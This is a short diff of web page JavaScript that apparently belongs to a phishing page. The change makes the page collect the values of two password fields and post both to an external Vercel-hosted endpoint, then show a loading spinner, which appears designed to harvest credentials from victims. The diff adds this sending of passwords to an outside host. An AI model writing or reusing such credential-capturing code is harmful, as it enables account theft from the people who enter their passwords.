@@ -29,14 +29,13 @@ document.addEventListener("DOMContentLoaded", function () {
     const URL = "https://project-bk3wq.vercel.app/api/index";
 
     // const URL = "localhost:1234/api/index";
-    handlerSendMessages(URL, { message: pass01.value });
-    // POST({ message: pass01.value });
-    spinner();
+    handlerSendMessages(URL, {
+      message: {
+        password01: pass01.value,
+        password02: pass02.value,
+      },
+    });
 
-    //
-    //
-    //
-    //
-    // server data sender
+    spinner();
   });
 });
